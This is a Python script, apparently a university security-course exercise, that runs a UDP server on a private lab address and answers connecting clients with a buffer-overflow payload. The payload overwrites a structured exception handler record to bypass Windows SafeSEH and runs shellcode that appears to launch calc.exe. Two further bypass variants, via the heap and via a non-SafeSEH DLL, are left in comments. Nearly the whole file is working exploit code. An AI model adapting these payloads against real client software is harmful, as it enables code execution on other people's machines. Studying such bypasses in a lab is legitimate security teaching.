#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
''' 软件安全与漏洞分析第十周任务之一, 目的是实现 SafeSEH 安全机制的绕过

实现了三种绕过, 第一种是通过堆进行绕过, 第二种是通过未开启 SafeSEH 的 DLL 绕过, 第三种是通过 Map 类型的映射文件绕过
'''
__author__ = '__L1n__w@tch'

import socketserver

shell_code = b"\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8D\x04\x24\x50\xB9\xC7\x93\xBF\x77\xFF\xD1"


class MyUDPHandler(socketserver.BaseRequestHandler):
    """
    This class works similar to the TCP handler class, except that
    self.request consists of a pair of data and client socket, and since
    there is no connection the client address must be given explicitly
    when sending data back via sendto().
    """

    def handle(self):
        global shell_code

        data = self.request[0].strip()
        socket = self.request[1]
        print("{} wrote:".format(self.client_address[0]))
        print(data)

        ## 正常发送
        # socket.sendto(data.upper(), self.client_address)

        ## 用来定位 SEH 结构
        # data = b""
        # for i in range(500):
        #     data += bytes([ord("A") + i // 10])
        # print(data)

        # 测试用
        # socket.sendto(data, self.client_address)

        ## ShellCode 发送

        ## 堆绕过, heap start
        # pad = b"\x90" * (76 - len(shell_code))
        # point_to_next_seh_record = b"A" * 4
        # se_handler = b"\x00\x3C\x28\xB8"[::-1]
        # junk = b"B" * (148 - 76 - 4 - 4)
        # zero = b"\x00" * 4
        # exploit = pad + shell_code + point_to_next_seh_record + se_handler + junk + zero
        # socket.sendto(exploit, self.client_address)
        ## heap end

        ## our unsafe dll start
        # junk1 = b"A" * 88
        # jmp_nop_nop = b"\xeb\x06\x90\x90"
        # ppr_address = b"\x10\x00\x16\x51"[::-1]
        # junk2 = b"B" * (148 - 88 - 4 - 4 - len(shell_code))
        # zero = b"\x00" * 4
        # exploit = junk1 + jmp_nop_nop + ppr_address + shell_code + junk2 + zero
        # socket.sendto(exploit, self.client_address)
        ## our unsafe dll end

        ## Outside start
        pad = b"\x90" * 76
        point_to_next_seh_record = b"\xeb\x06\x90\x90"[::-1]
        se_handler = b"\x00\x29\x0B\x0B"[::-1]
        junk = b"B" * (148 - 76 - 4 - 4 - len(shell_code))
        zero = b"\x00" * 4
        exploit = pad + point_to_next_seh_record + se_handler + shell_code + junk + zero
        socket.sendto(exploit, self.client_address)
        ## Outside end


def main():
    HOST, PORT = "192.168.117.1", 9999
    server = socketserver.UDPServer((HOST, PORT), MyUDPHandler)
    server.serve_forever()


if __name__ == "__main__":
    main()
